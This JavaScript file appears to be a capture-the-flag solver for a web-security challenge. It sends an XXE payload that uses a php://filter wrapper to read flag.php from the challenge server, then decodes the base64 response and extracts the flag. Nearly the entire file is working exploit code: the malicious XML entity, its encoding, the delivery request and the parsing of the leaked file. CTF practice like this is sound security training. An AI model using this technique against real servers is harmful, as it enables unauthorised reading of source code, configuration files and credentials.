import axios from 'axios'

const url = 'https://xxe1.secu-web.blackfoot.dev'

const payload = `<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.php"> ]>
<document>
	<message>&xxe;</message>
</document>
`

const thankYouRgx = /Thanks for your message: '(.+)'/
const flagRgx = /(...{.+})/

function encodeXml(xml) {
	return encodeURIComponent(btoa(xml))
}

async function getFlagPhp() {
	const res = await axios({
		method: 'post',
		url: `${url}/index.php`,
		data: `xml=${encodeXml(payload)}`
	})

	const b64 = res.data.match(thankYouRgx)[1]

	return atob(b64)
}

async function main() {
	const flagPhp = await getFlagPhp()
	console.log(`flag.php:\n${flagPhp}`)

	const flag = flagPhp.match(flagRgx)[0]
	console.log(`flag: ${flag}`)
}

main()
